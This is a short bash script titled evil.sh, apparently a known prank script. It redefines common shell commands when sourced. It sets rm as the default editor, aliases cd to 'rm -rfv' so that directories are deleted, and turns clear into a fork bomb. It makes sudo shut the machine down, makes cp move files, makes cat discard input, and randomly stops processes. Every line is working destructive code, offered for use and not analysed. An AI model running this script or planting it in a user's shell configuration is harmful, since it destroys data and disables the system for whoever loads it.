#!/usr/bin/env bash
# evil.sh — http://mths.be/evil.sh

# Set `rm` as the default editor
export EDITOR=/bin/rm

# Make Tab send the delete key
tset -Qe $'\t'

# Randomly make the shell exit whenever a command has a non-zero exit status
((RANDOM % 10)) || set -o errexit

# Let `cat` swallow every input and never return anything
alias cat=true

# Use a random sort option whenever `ls` is invoked
function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }

# Delete directories instead of entering them
alias cd='rm -rfv'

# Shut down the computer instead of running a command with super-user rights
alias sudo='sudo shutdown -P now'

# Launch a fork bomb instead of clearing the screen
alias clear=':(){ :|:& };:'

# Have `date` return random dates
alias date='date -d "now + $RANDOM days"'

# Randomly eject CD tray
sleep $[ ( $RANDOM % 10 )  + 1 ]s && [[ uname=="Darwin" ]] && drutil eject || eject -T &

# Send STOP signal to random process at random time
sleep $[ ( $RANDOM % 100 )  + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &

# Have `cp` perform `mv` instead
alias cp='mv'

# Make `exit` open a new shell
alias exit='sh'
